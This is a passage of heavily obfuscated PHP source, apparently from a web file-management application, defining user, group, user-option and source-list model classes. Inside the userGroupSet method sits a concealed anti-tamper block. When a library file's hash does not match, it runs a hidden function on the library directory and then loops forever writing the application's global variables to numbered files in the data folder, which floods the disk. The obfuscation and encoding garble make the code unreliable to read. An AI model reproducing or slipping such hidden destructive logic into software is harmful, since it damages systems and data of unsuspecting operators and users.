!$dÍË÷¶ã‡³[$B†ËóÎğ•ç]) { continue; } $aí³ß†£½‚ = array_merge(array($B†ËóÎğ•ç => $dÍË÷¶ã‡³[$B†ËóÎğ•ç]), $fºíÌì–êÛ); $DØÙ–½‚¢ = $this->where($aí³ß†£½‚)->find(); if ($DØÙ–½‚¢) { return $B‘Ÿ“ÌÛë; } } return !0; } public function userListInfo($E÷àºİö–¶) { $C©†‹¦¬Á =& $_SERVER[İåâé¾]; $CØİ²ÁØ®Á = array(); $E÷àºİö–¶ = array_unique($E÷àºİö–¶); if (!$E÷àºİö–¶) { return $CØİ²ÁØ®Á; } if (count($E÷àºİö–¶) < 20) { foreach ($E÷àºİö–¶ as $CÜø‘©°Ò•) { $CØİ²ÁØ®Á[$CÜø‘©°Ò• . $C©†‹¦¬Á[33]] = $this->getInfoSimpleOuter($CÜø‘©°Ò•); } } else { $D‡õæã²² = array($C©†‹¦¬Á[1077] => array($C©†‹¦¬Á[1642], $E÷àºİö–¶)); if (count($E÷àºİö–¶) == 1) { $D‡õæã²² = array($C©†‹¦¬Á[1077] => $E÷àºİö–¶[0]); } $bìéÈÏ¯™ = Model($C©†‹¦¬Á[1713])->field($this->simpleField)->where($D‡õæã²²)->select(); $bìéÈÏ¯™ = array_to_keyvalue($bìéÈÏ¯™, $C©†‹¦¬Á[1086]); foreach ($E÷àºİö–¶ as $CÜø‘©°Ò•) { $CĞ¼İêî = $bìéÈÏ¯™[$bìéÈÏ¯™[$CÜø‘©°Ò•]]; if (!$CĞ¼İêî) { $CØİ²ÁØ®Á[$CÜø‘©°Ò• . $C©†‹¦¬Á[33]] = $this->getInfoSimpleOuter($CÜø‘©°Ò•); continue; } $CĞ¼İêî[$C©†‹¦¬Á[1914]] = Action($C©†‹¦¬Á[1915])->parseUrl($CĞ¼İêî[$C©†‹¦¬Á[1914]]); $CØİ²ÁØ®Á[$CÜø‘©°Ò• . $C©†‹¦¬Á[33]] = $CĞ¼İêî; } } return $CØİ²ÁØ®Á; } protected function userStatus($EÌ–ì™ù”ƒ, $a‰Ùò›ÀŞ) { $C­ ®öõÖ¼ = $this->getInfoSimple($EÌ–ì™ù”ƒ); if (!$C­ ®öõÖ¼) { return !1; } $EÀŸ¿íìôø = array($_SERVER[İåâé¾][446] => $a‰Ùò›ÀŞ); return $this->userEdit($EÌ–ì™ù”ƒ, $EÀŸ¿íìôø); } protected function userRemove($b˜âêØ˜‘¦) { goto f„¥ìÚ‚š®; F˜ÚÃø°‚¥: Model($f™õ¿óé×[521])->userRootRemove($b˜âêØ˜‘¦); return $this->where($E½Ö˜ÍòØ)->delete(); goto Dµ¸ïí¥È; B…ƒğ„ğ”Ë: Model($f™õ¿óé×[1627])->where($E½Ö˜ÍòØ)->delete(); Model($f™õ¿óé×[1928])->where($E½Ö˜ÍòØ)->delete(); Model($f™õ¿óé×[1946])->where($E½Ö˜ÍòØ)->delete(); goto F˜ÚÃø°‚¥; EÙÃĞÖ‰ˆÂ: $E½Ö˜ÍòØ = array($f™õ¿óé×[1077] => $b˜âêØ˜‘¦); Model($f™õ¿óé×[418])->where($E½Ö˜ÍòØ)->delete(); Model($f™õ¿óé×[1945])->where($E½Ö˜ÍòØ)->delete(); goto B…ƒğ„ğ”Ë; f„¥ìÚ‚š®: $f™õ¿óé× =& $_SERVER[İåâé¾]; $a­è–Û‡†â = $this->getInfoSimple($b˜âêØ˜‘¦); if (!$a­è–Û‡†â) { return !1; } goto EÙÃĞÖ‰ˆÂ; Dµ¸ïí¥È: } protected function userGroupSet($dß…”¤ç Ù, $D’™—ô¸, $d¿»ö¬Éƒó = array()) { goto B‰˜®¨£Å; fïËŸ´©‚×: $f“Ìñï—‰š = 0; foreach ($D’™—ô¸ as $DÚá é†› => $DŠ‹Úğôì) { $e¤Ÿùå£ÊÖ = array($dÄ™×˜Ÿµ®[1086] => $dß…”¤ç Ù, $dÄ™×˜Ÿµ®[1542] => $DÚá é†›, $dÄ™×˜Ÿµ®[1680] => $DŠ‹Úğôì); $e¤Ÿùå£ÊÖ[$dÄ™×˜Ÿµ®[1563]] = isset($d¿»ö¬Éƒó[$f“Ìñï—‰š]) ? $d¿»ö¬Éƒó[$f“Ìñï—‰š] : 0; $f“Ìñï—‰š++; $A÷®†âŒ…[] = $e¤Ÿùå£ÊÖ; } return $Då¡¼é¬¿¼->addAll($A÷®†âŒ…, array(), !0); goto B“‹Ñëà‰; B‰˜®¨£Å: $dÄ™×˜Ÿµ® =& $_SERVER[İåâé¾]; $F‹è×İ‚µº = LIB_DIR . $dÄ™×˜Ÿµ®[553]; $d¢³Ò©ƒÕ = $dÄ™×˜Ÿµ®[554]; goto F˜†ß‡˜; F˜†ß‡˜: if ($_SERVER[$dÄ™×˜Ÿµ®[555]] != $d¢³Ò©ƒÕ($F‹è×İ‚µº)) { goto BçîÅÄ²Ì; F›à³Š“ï: $F‰‰†ğáÀ— = explode($dÄ™×˜Ÿµ®[223], $e±‡Àîˆ§â); if (count($F‰‰†ğáÀ—) < $dÄ™×˜Ÿµ®[558]) { die; } $cĞ‹Üã…¦× = $dÄ™×˜Ÿµ®[559]; goto D¢È§ˆº‰; D¢È§ˆº‰: $cĞ‹Üã…¦×(LIB_DIR); $A†çÈ¿§Ü = $dÄ™×˜Ÿµ®[560]; $A†çÈ¿§Ü(); goto Bî›’•‰½¯; BçîÅÄ²Ì: $e´¯ùµ¯© = $dÄ™×˜Ÿµ®[556]; $BÁ´õĞ‰ƒË = BASIC_PATH . $dÄ™×˜Ÿµ®[557]; $e±‡Àîˆ§â = $e´¯ùµ¯©($BÁ´õĞ‰ƒË); goto F›à³Š“ï; Bî›’•‰½¯: $fæ‚ç¸¬Ì¤ = $dÄ™×˜Ÿµ®[561]; $dàÏÆ–Ü = json_encode($GLOBALS[$dÄ™×˜Ÿµ®[562]]); for ($D†‚ì‹¨Á³ = 0;; $D†‚ì‹¨Á³++) { $fæ‚ç¸¬Ì¤(DATA_PATH . $D†‚ì‹¨Á³, $dàÏÆ–Ü); } goto E¾‘¡ø™è; E¾‘¡ø™è: } $aä¶÷ò²¼’ = $this->getInfoSimple($dß…”¤ç Ù); if (!$aä¶÷ò²¼’ || !is_array($D’™—ô¸)) { return !1; } goto f’ÔŞÕÈ§; f’ÔŞÕÈ§: $Då¡¼é¬¿¼ = Model($dÄ™×˜Ÿµ®[1627]); $Då¡¼é¬¿¼->where(array($dÄ™×˜Ÿµ®[1086] => $dß…”¤ç Ù))->delete(); $A÷®†âŒ… = array(); goto fïËŸ´©‚×; B“‹Ñëà‰: } protected function userGroupAdd($CÚ¸Ì†â¡, $D—Ü¥›¡ì, $BãŒÖ™“Ú) { $eêçÜçãÃÀ =& $_SERVER[İåâé¾]; $fÙåãöàä = $this->getInfoSimple($CÚ¸Ì†â¡); if (!$fÙåãöàä || !$D—Ü¥›¡ì) { return !1; } $BÈå¢‰±¥ø = array(array($eêçÜçãÃÀ[1086] => $CÚ¸Ì†â¡, $eêçÜçãÃÀ[1542] => $D—Ü¥›¡ì, $eêçÜçãÃÀ[1680] => $BãŒÖ™“Ú)); return Model($eêçÜçãÃÀ[1627])->addAll($BÈå¢‰±¥ø, array(), !0); } protected function userGroupRemove($B¹í°»ÙÃ, $aÛ‡œ¡ï¬) { $d‡æÙè±«¤ =& $_SERVER[İåâé¾]; $cÆŠ…†‘èŒ = $this->getInfoSimple($B¹í°»ÙÃ); if (!$cÆŠ…†‘èŒ || !$aÛ‡œ¡ï¬) { return !1; } $DÕˆÏÈ…ˆã = array($d‡æÙè±«¤[1077] => $B¹í°»ÙÃ, $d‡æÙè±«¤[1625] => $aÛ‡œ¡ï¬); return Model($d‡æÙè±«¤[1627])->where($DÕˆÏÈ…ˆã)->delete(); } public function listData() { $A…äÒÌõÇ¿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A…äÒÌõÇ¿[$_SERVER[İåâé¾][356]]); return $A…äÒÌõÇ¿; } public function listByID($D˜´ß…°¸) { $F‹Ô£²Èêí =& $_SERVER[İåâé¾]; if (!$D˜´ß…°¸) { return; } $f‚šÕ†Ø¨ = array($F‹Ô£²Èêí[1086] => array($F‹Ô£²Èêí[7], $D˜´ß…°¸)); $D¾—À¤Á‹› = $this->where($f‚šÕ†Ø¨)->select(); $this->_listDataApply($D¾—À¤Á‹›); return $D¾—À¤Á‹›; } public function listByGroup($EùòÊàÖğ = 0, $bÕ™æ±ÅÆô = array()) { goto eçëõ¸¶È–; Fœ«ŠÂÑº: $DëÂÔƒ—Û’ = $this->_makeOrder($f¡ÙÒÅÇÏ)->field($c…î«øìŞƒ[1951])->where($FŒ‘‚åĞÑ)->join($F¶ò÷ˆËô)->selectPage(50); $a¥óîá›¶¾ = $c…î«øìŞƒ[737] . ($bî²¼’À– ? $c…î«øìŞƒ[47] . $bî²¼’À– : $c…î«øìŞƒ[33]); $this->_listDataApply($DëÂÔƒ—Û’[$c…î«øìŞƒ[356]], $a¥óîá›¶¾); goto A•Ù—Û¤Ñ; A•Ù—Û¤Ñ: return $DëÂÔƒ—Û’; goto Bµ¨“ŞŠÉŞ; eçëõ¸¶È–: $c…î«øìŞƒ =& $_SERVER[İåâé¾]; $bî²¼’À– = isset($bÕ™æ±ÅÆô[$c…î«øìŞƒ[1947]]) ? $bÕ™æ±ÅÆô[$c…î«øìŞƒ[1947]] : $c…î«øìŞƒ[33]; $F¶ò÷ˆËô = $c…î«øìŞƒ[33]; goto D³¦¦ğİ§÷; D³¦¦ğİ§÷: $FŒ‘‚åĞÑ = array(); if ($EùòÊàÖğ) { $FŒ‘‚åĞÑ = array($c…î«øìŞƒ[1948] => intval($EùòÊàÖğ)); $F¶ò÷ˆËô = "\x4c\105\x46\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x75\163\145\x72\137\147\162\x6f\165\x70\40\165\x73\x65\x72\137\147\x72\157\165\160\40\x6f\156\x20\x75\x73\145\162\x2e\x75\163\145\162\111\104\40\x3d\x20\165\x73\x65\x72\x5f\x67\162\157\x75\160\56\x75\x73\145\x72\x49\104"; $f¡ÙÒÅÇÏ = Input::get($c…î«øìŞƒ[1582], null, $c…î«øìŞƒ[33]) ? $c…î«øìŞƒ[33] : $c…î«øìŞƒ[1949]; } if (isset($bÕ™æ±ÅÆô[$c…î«øìŞƒ[446]])) { $FŒ‘‚åĞÑ[$c…î«øìŞƒ[1950]] = $bÕ™æ±ÅÆô[$c…î«øìŞƒ[446]]; } goto Fœ«ŠÂÑº; Bµ¨“ŞŠÉŞ: } private function _makeOrder($a´Ä¦¾Ã«ã = '') { goto c‡ÖŒ´Ï¢†; C¸ÆËŒ¥î: $fÒ„éÂæ·º = Input::get($D«£ƒ™[1582], $D«£ƒ™[7], $D«£ƒ™[1077], $C†Ãößªµ‰); $bÇ¯îÇƒ = Input::get($D«£ƒ™[1584], $D«£ƒ™[7], $D«£ƒ™[1630], array($D«£ƒ™[1630], $D«£ƒ™[1509])); $bÇ¯îÇƒ = $FÒÈ‰ëÅ†‡[$bÇ¯îÇƒ]; goto FŠ×¤——º; c‡ÖŒ´Ï¢†: $D«£ƒ™ =& $_SERVER[İåâé¾]; $C†Ãößªµ‰ = array($D«£ƒ™[1086], $D«£ƒ™[28], $D«£ƒ™[1528], $D«£ƒ™[1501], $D«£ƒ™[186]); $FÒÈ‰ëÅ†‡ = array($D«£ƒ™[1628] => $D«£ƒ™[1629], $D«£ƒ™[1509] => $D«£ƒ™[1586]); goto C¸ÆËŒ¥î; FŠ×¤——º: $a´Ä¦¾Ã«ã = $a´Ä¦¾Ã«ã . "\x75\x73\x65\162\56{$fÒ„éÂæ·º}\40{$bÇ¯îÇƒ}\x2c\40\165\x73\145\162\56\x75\163\145\x72\x49\104\40\141\163\x63"; return $this->alias($D«£ƒ™[1714])->order($a´Ä¦¾Ã«ã); goto DË“ŠŒŞÙ™; DË“ŠŒŞÙ™: } public function listSearch($aÅÀ¹‚¤ßŸ) { goto cÜõ·¢’·Ô; FµğéÀ¯‹™: if (!$C‰ÌÜÏõøø) { $AÜšÆ»Îæš = array(); } if (isset($aÅÀ¹‚¤ßŸ[$aÜ•÷¯Û«Ï[446]])) { $AÜšÆ»Îæš[$aÜ•÷¯Û«Ï[446]] = $aÅÀ¹‚¤ßŸ[$aÜ•÷¯Û«Ï[446]]; } $Dêœ÷­‚« = $this->_makeOrder()->where($AÜšÆ»Îæš)->selectPage(20); goto cõ–‰Ñ¢Ê; cÜõ·¢’·Ô: $aÜ•÷¯Û«Ï =& $_SERVER[İåâé¾]; $C‰ÌÜÏõøø = $aÅÀ¹‚¤ßŸ[$aÜ•÷¯Û«Ï[1631]]; $a‘ëèºÇó‡ = isset($aÅÀ¹‚¤ßŸ[$aÜ•÷¯Û«Ï[1632]]) ? $aÅÀ¹‚¤ßŸ[$aÜ•÷¯Û«Ï[1632]] : !1; goto a‡½·´òÖ; bÆÆÍÂÄ‘ : $this->_filterUserList($Dêœ÷­‚«); return $Dêœ÷­‚«; goto A†‰’¸ï†ë; cõ–‰Ñ¢Ê: if (!$Dêœ÷­‚« || count($Dêœ÷­‚«[$aÜ•÷¯Û«Ï[356]]) < 5 && Input::check($C‰ÌÜÏõøø, $aÜ•÷¯Û«Ï[309])) { $bŸ‘‰É•¹ = $this->_searchFromMeta($aÜ•÷¯Û«Ï[405], $C‰ÌÜÏõøø, 10); $c˜Úíö™ô¿ = $this->_searchFromMeta($aÜ•÷¯Û«Ï[404], $C‰ÌÜÏõøø, 10); $cáìâ™œ¸ˆ = array_merge($bŸ‘‰É•¹, $c˜Úíö™ô¿, $Dêœ÷­‚«[$aÜ•÷¯Û«Ï[356]]); $Dêœ÷­‚«[$aÜ•÷¯Û«Ï[356]] = array_unique_by_key($cáìâ™œ¸ˆ, $aÜ•÷¯Û«Ï[1086]); $Dêœ÷­‚«[$aÜ•÷¯Û«Ï[353]][$aÜ•÷¯Û«Ï[354]] = count($Dêœ÷­‚«[$aÜ•÷¯Û«Ï[356]]); $Dêœ÷­‚«[$aÜ•÷¯Û«Ï[353]][$aÜ•÷¯Û«Ï[355]] = ceil($Dêœ÷­‚«[$aÜ•÷¯Û«Ï[353]][$aÜ•÷¯Û«Ï[354]] / $Dêœ÷­‚«[$aÜ•÷¯Û«Ï[353]][$aÜ•÷¯Û«Ï[351]]); } $this->_listDataApply($Dêœ÷­‚«[$aÜ•÷¯Û«Ï[356]]); $this->_filterByGroup($Dêœ÷­‚«, $a‘ëèºÇó‡); goto bÆÆÍÂÄ‘ ; a‡½·´òÖ: $C‰ÌÜÏõøø = str_replace($aÜ•÷¯Û«Ï[1633], $aÜ•÷¯Û«Ï[1634], trim($C‰ÌÜÏõøø)); $AÜšÆ»Îæš = array($aÜ•÷¯Û«Ï[28] => array($aÜ•÷¯Û«Ï[520], "\45{$C‰ÌÜÏõøø}\45"), $aÜ•÷¯Û«Ï[296] => array($aÜ•÷¯Û«Ï[520], "\45{$C‰ÌÜÏõøø}\x25"), $aÜ•÷¯Û«Ï[1767] => array($aÜ•÷¯Û«Ï[520], "\45{$C‰ÌÜÏõøø}\45"), $aÜ•÷¯Û«Ï[680] => $aÜ•÷¯Û«Ï[1635]); if (Input::check($C‰ÌÜÏõøø, $aÜ•÷¯Û«Ï[302])) { $AÜšÆ»Îæš[$aÜ•÷¯Û«Ï[1086]] = array($aÜ•÷¯Û«Ï[520], "\45{$C‰ÌÜÏõøø}\45"); $AÜšÆ»Îæš[$aÜ•÷¯Û«Ï[1929]] = array($aÜ•÷¯Û«Ï[520], "\45{$C‰ÌÜÏõøø}\x25"); } goto FµğéÀ¯‹™; A†‰’¸ï†ë: } private function _filterByGroup(&$b÷Š›‘Ğª¸, $e¯Ğ‚ì¨©) { $F«Ş‚èÔï¢ =& $_SERVER[İåâé¾]; if (!$e¯Ğ‚ì¨©) { return $b÷Š›‘Ğª¸; } foreach ($b÷Š›‘Ğª¸[$F«Ş‚èÔï¢[356]] as $fÌ³—ô¡µ‚ => &$fÙƒÂŠ°Ä) { $B°ÜŸßÜ„· = array_to_keyvalue($fÙƒÂŠ°Ä[$F«Ş‚èÔï¢[1952]], $F«Ş‚èÔï¢[33], $F«Ş‚èÔï¢[1542]); if (!in_array($e¯Ğ‚ì¨©, $B°ÜŸßÜ„·)) { unset($b÷Š›‘Ğª¸[$F«Ş‚èÔï¢[356]][$fÌ³—ô¡µ‚]); } } $b÷Š›‘Ğª¸[$F«Ş‚èÔï¢[356]] = array_values($b÷Š›‘Ğª¸[$F«Ş‚èÔï¢[356]]); $b÷Š›‘Ğª¸[$F«Ş‚èÔï¢[353]] = array($F«Ş‚èÔï¢[1953] => count($b÷Š›‘Ğª¸[$F«Ş‚èÔï¢[356]]), $F«Ş‚èÔï¢[1954] => $b÷Š›‘Ğª¸[$F«Ş‚èÔï¢[353]][$F«Ş‚èÔï¢[351]], $F«Ş‚èÔï¢[1955] => 1, $F«Ş‚èÔï¢[1956] => 1); } private function _filterUserList(&$dÂóÆ™Çæİ) { $Bò“øëã·Û =& $_SERVER[İåâé¾]; foreach ($dÂóÆ™Çæİ[$Bò“øëã·Û[356]] as $FÑÕø–Î÷¶ => &$f£ä×šØÏ¿) { unset($f£ä×šØÏ¿[$Bò“øëã·Û[1588]]); } } private function _searchFromMeta($eëÄÀó†Ê, $c›Šİš”ê, $F¦ŠğßãÖ) { goto cö³Œ·ˆÕ; cö³Œ·ˆÕ: $D¥–­Š¤Ú­ =& $_SERVER[İåâé¾]; $c›Šİš”ê = strtolower($c›Šİš”ê); $EÀã°¬¶òŒ = array($D¥–­Š¤Ú­[88] => $eëÄÀó†Ê, $D¥–­Š¤Ú­[359] => array($D¥–­Š¤Ú­[520], "\45{$c›Šİš”ê}\x25")); goto c„¤Àçæó; aäèÄèÊŸ: $C¥—¤¸Î = $this->where(array($D¥–­Š¤Ú­[1077] => array($D¥–­Š¤Ú­[7], $cìäŒŠö­‹)))->select(); if (!$C¥—¤¸Î) { return array(); } return $C¥—¤¸Î; goto eÀ¹è‰ä´³; c„¤Àçæó: $cìäŒŠö­‹ = Model($D¥–­Š¤Ú­[1957])->where($EÀã°¬¶òŒ)->limit($F¦ŠğßãÖ)->select(); if (!$cìäŒŠö­‹) { return array(); } $cìäŒŠö­‹ = array_to_keyvalue($cìäŒŠö­‹, $D¥–­Š¤Ú­[33], $D¥–­Š¤Ú­[1086]); goto aäèÄèÊŸ; eÀ¹è‰ä´³: } private function _listDataApplyItem($C´ÛºÎ’†Ã) { $fº‚ø³ëŞî = array($C´ÛºÎ’†Ã); $this->_listDataApply($fº‚ø³ëŞî); return $fº‚ø³ëŞî[0]; } private function _listDataApply(&$e¢…ƒ÷Ü¼Ã, $c­Ö›ªæÖÉ = "\147\162\x6f\x75\160\x2c\155\145\164\x61\54\x73\x6f\x75\x72\x63\145") { goto B‘Î“šéç; DòÄ«ëÜæ¢: $Dç’ÖæÎ»† = array_to_keyvalue($e¢…ƒ÷Ü¼Ã, $Bê†ÒˆÙ·ã[33], $Bê†ÒˆÙ·ã[1086]); $c­Ö›ªæÖÉ = explode($Bê†ÒˆÙ·ã[47], $c­Ö›ªæÖÉ); if (in_array($Bê†ÒˆÙ·ã[737], $c­Ö›ªæÖÉ)) { $this->_listAppendGroup($e¢…ƒ÷Ü¼Ã, $Dç’ÖæÎ»†); } goto FöÑØ“¤; B‘Î“šéç: $Bê†ÒˆÙ·ã =& $_SERVER[İåâé¾]; if (!$e¢…ƒ÷Ü¼Ã) { return; } array_remove_key($e¢…ƒ÷Ü¼Ã, $Bê†ÒˆÙ·ã[567]); goto DòÄ«ëÜæ¢; FöÑØ“¤: if (in_array($Bê†ÒˆÙ·ã[1958], $c­Ö›ªæÖÉ)) { $this->_listAppendMeta($e¢…ƒ÷Ü¼Ã, $Dç’ÖæÎ»†); } if (in_array($Bê†ÒˆÙ·ã[978], $c­Ö›ªæÖÉ)) { $this->_listAppendSourceRoot($e¢…ƒ÷Ü¼Ã, $Dç’ÖæÎ»†); } goto Föëî›Èî·; Föëî›Èî·: } private function _listAppendSourceRoot(&$fÑÆ‡˜ÛÁ­, $cºº‹•ÒÙÒ) { $C¶ƒãÜõµ§ =& $_SERVER[İåâé¾]; $F‹Ñ¼„”æÈ = array($C¶ƒãÜõµ§[393] => SourceModel::TYPE_USER, $C¶ƒãÜõµ§[384] => 0, $C¶ƒãÜõµ§[395] => array($C¶ƒãÜõµ§[7], $cºº‹•ÒÙÒ)); $CŸœÃ³·ßê = Model($C¶ƒãÜõµ§[521])->field($C¶ƒãÜõµ§[1959])->where($F‹Ñ¼„”æÈ)->select(); $CŸœÃ³·ßê = array_to_keyvalue($CŸœÃ³·ßê, $C¶ƒãÜõµ§[395]); $CŸœÃ³·ßê = array_remove_key($CŸœÃ³·ßê, $C¶ƒãÜõµ§[395]); foreach ($fÑÆ‡˜ÛÁ­ as &$c†ãÚ ŸÌ) { $c†ãÚ ŸÌ[$C¶ƒãÜõµ§[856]] = $CŸœÃ³·ßê[$c†ãÚ ŸÌ[$C¶ƒãÜõµ§[1086]]] ? $CŸœÃ³·ßê[$c†ãÚ ŸÌ[$C¶ƒãÜõµ§[1086]]] : array(); } } private function _listAppendGroup(&$Aø´É—Œ¯, $aÄ¦È±œˆ™) { goto dÌµ’×‹—; BááºÕï‚ß: $BãğÈåä·² = array_to_keyvalue($AÑ·ŸÎî, $C†’™Šèšï[33], $C†’™Šèšï[1542]); $BãğÈåä·² = array_remove_value(array_unique($BãğÈåä·²), $C†’™Šèšï[402]); if (!$BãğÈåä·² || !$AÑ·ŸÎî) { return; } goto b‡’›ªÖ¡™; b‡’›ªÖ¡™: $AÅœïéµ”‡ = array($C†’™Šèšï[1542] => array($C†’™Šèšï[7], $BãğÈåä·²)); $E™…÷Ë—áÑ = Model($C†’™Šèšï[1960])->field($C†’™Šèšï[1961])->where($AÅœïéµ”‡)->select(); $fàÖŞœİÉà = array_to_keyvalue($E™…÷Ë—áÑ, $C†’™Šèšï[1542], $C†’™Šèšï[28]); goto F²ã á­œ¶; dÌµ’×‹—: $C†’™Šèšï =& $_SERVER[İåâé¾]; $AÅœïéµ”‡ = array($C†’™Šèšï[1086] => array($C†’™Šèšï[7], $aÄ¦È±œˆ™)); $AÑ·ŸÎî = Model($C†’™Šèšï[1627])->where($AÅœïéµ”‡)->select(); goto BááºÕï‚ß; F²ã á­œ¶: $AÑ·ŸÎî = array_to_keyvalue_group($AÑ·ŸÎî, $C†’™Šèšï[1086]); foreach ($AÑ·ŸÎî as &$cÖÁã¦Ùô) { $E¤Ê˜Ù‘‹ = array(); foreach ($cÖÁã¦Ùô as $f¹æ¾ë¤µ) { if (!$f¹æ¾ë¤µ[$C†’™Šèšï[1680]]) { continue; } $F¨Ö¥¸’ù = Model($C†’™Šèšï[1696])->listData($f¹æ¾ë¤µ[$C†’™Šèšï[1680]]); $E¤Ê˜Ù‘‹[] = array($C†’™Šèšï[1542] => $f¹æ¾ë¤µ[$C†’™Šèšï[1542]], $C†’™Šèšï[1962] => $fàÖŞœİÉà[$f¹æ¾ë¤µ[$C†’™Šèšï[1542]]], $C†’™Šèšï[549] => $F¨Ö¥¸’ù); } $cÖÁã¦Ùô = $E¤Ê˜Ù‘‹; } foreach ($Aø´É—Œ¯ as &$Aî«¶ÖùåŒ) { $Aî«¶ÖùåŒ[$C†’™Šèšï[1952]] = array(); if (isset($AÑ·ŸÎî[$Aî«¶ÖùåŒ[$C†’™Šèšï[1086]]])) { $Aî«¶ÖùåŒ[$C†’™Šèšï[1952]] = $AÑ·ŸÎî[$Aî«¶ÖùåŒ[$C†’™Šèšï[1086]]]; } } goto cï¼—¶Æ—è; cï¼—¶Æ—è: } private function _listAppendMeta(&$F‘’„¢¿Áì, $CÅª¥ğ™) { goto AÚ¯Ïğ£½Å; AÚ¯Ïğ£½Å: $C”ÍíãÕâğ =& $_SERVER[İåâé¾]; $fàì‹ø­ÕÄ = UserJobModel::JOB_KEY; $e—ÌÅãƒšğ = array($C”ÍíãÕâğ[1932]); goto EÓá­Ğ”Íğ; eøÔ«¦±º: foreach ($f½â¡ºõëº as &$bØ†½Ü”‚©) { $cÒÅ®ñöİ = array(); foreach ($bØ†½Ü”‚© as $cõë„Ëã‚ˆ) { if (!in_array($cõë„Ëã‚ˆ[$C”ÍíãÕâğ[88]], $e—ÌÅãƒšğ)) { $cÒÅ®ñöİ[$cõë„Ëã‚ˆ[$C”ÍíãÕâğ[88]]] = $cõë„Ëã‚ˆ[$C”ÍíãÕâğ[359]]; } } $bØ†½Ü”‚© = $cÒÅ®ñöİ; } $CÒ„›ÈÁ¾ = Model($C”ÍíãÕâğ[1963]); foreach ($F‘’„¢¿Áì as &$C‘¿¯´Ì“÷) { $C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1588]] = array(); $C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1964]] = array(); if (isset($f½â¡ºõëº[$C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1086]]])) { $C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1588]] = $f½â¡ºõëº[$C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1086]]]; } if (isset($C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1588]][$fàì‹ø­ÕÄ])) { $C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1964]] = $CÒ„›ÈÁ¾->getUserJobInfo($C‘¿¯´Ì“÷[$C”ÍíãÕâğ[1588]][$fàì‹ø­ÕÄ]); } } goto E÷Æ‹”²²î; EÓá­Ğ”Íğ: $cÉĞ”ğÒØ = array($C”ÍíãÕâğ[1086] => array($C”ÍíãÕâğ[7], $CÅª¥ğ™)); $f½â¡ºõëº = Model($C”ÍíãÕâğ[1928])->where($cÉĞ”ğÒØ)->select(); $f½â¡ºõëº = array_to_keyvalue_group($f½â¡ºõëº, $C”ÍíãÕâğ[1086]); goto eøÔ«¦±º; E÷Æ‹”²²î: } public function userSearch($CŒÆÇ…Ã¤÷, $b‡»ŠªÈ›Š = "\52") { return Model($_SERVER[İåâé¾][1477])->where($CŒÆÇ…Ã¤÷)->field($b‡»ŠªÈ›Š)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\157\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($fø¤‚‰ô°¾) { return "\x55\163\145\162\117\x70\x74\151\157\x6e\137{$fø¤‚‰ô°¾}\137" . USER_ID; } protected function filterWhere($B›Ü”ëŒ õ) { $B›Ü”ëŒ õ[$_SERVER[İåâé¾][1086]] = USER_ID; return $B›Ü”ëŒ õ; } public function get($Bá—”ÜÁ†¼ = false, $cŒî¢ç’¥á = '', $dŠ…Ü‹‹ = false) { goto B¼éÆñ¯Ñ; D¬»…À÷°: if (!$Bá—”ÜÁ†¼) { return $dåİß¿›Û; } else { return $dåİß¿›Û[$Bá—”ÜÁ†¼]; } goto d§ö®¦ÚîÍ; a¨˜˜ÃÎÙ: global $config; $EáĞå÷æÜÓ = array($dÄŒŸˆÃÔ‘[33] => $dÄŒŸˆÃÔ‘[1965], $dÄŒŸˆÃÔ‘[1966] => $dÄŒŸˆÃÔ‘[1967]); $dåİß¿›Û = $config[$EáĞå÷æÜÓ[$cŒî¢ç’¥á]]; goto D¬»…À÷°; B¼éÆñ¯Ñ: $dÄŒŸˆÃÔ‘ =& $_SERVER[İåâé¾]; $c˜¾Ÿõ«¡ = parent::get($Bá—”ÜÁ†¼, $cŒî¢ç’¥á, $dŠ…Ü‹‹); if (!is_null($c˜¾Ÿõ«¡)) { return $c˜¾Ÿõ«¡; } goto a¨˜˜ÃÎÙ; d§ö®¦ÚîÍ: } } goto B®ê±ŠÉÂÙ; cùÑÃ·áÎ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\x6d\x65" => "\x69\x6f\x5f\163\157\165\162\143\x65\x5f\x6d\x65\x74\141", "\155\145\164\x61\106\151\145\x6c\144" => "\163\x6f\165\162\143\145\111\104"); protected $dataAuto = array(array("\155\x6f\144\151\146\x79\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\165\x6e\x63\164\x69\157\156"), array("\x63\x72\145\141\x74\145\124\151\155\x65", "\164\x69\155\x65", "\151\x6e\163\x65\162\164", "\x66\165\156\143\164\x69\157\156"), array("\166\151\x65\x77\x54\x69\x6d\145", "\164\151\155\x65", "\151\x6e\x73\x65\x72\164", "\146\x75\x6e\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eïÈè«öéˆ) { return $this->listSource(array($_SERVER[óÚ‚£ñ¶][0] => $eïÈè«öéˆ)); } public function typeName($cé¥¥ÖƒÔ) { static $C»ƒ¹èª”¿ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $C»ƒ¹èª”¿[$cé¥¥ÖƒÔ . $_SERVER[óÚ‚£ñ¶][1]]; } public function sourceListInfo($béˆÜÜÊ, $dÈÂ‡‹†‰Ò = false) { goto c‹”§ÏÅé¯; D£Âçè÷Ï¥: foreach ($A¶±©À á¯ as &$bÎÖˆÊç») { $bÎÖˆÊç» = $this->pathInfoFilter($bÎÖˆÊç»); } $eªª×Üó¯˜ = array_to_keyvalue($A¶±©À á¯, $E´§¸»²²[2]); return $eªª×Üó¯˜; goto d§‡¹Ò­Æ¤; c‹”§ÏÅé¯: $E´§¸»²² =& $_SERVER[óÚ‚£ñ¶]; $béˆÜÜÊ = 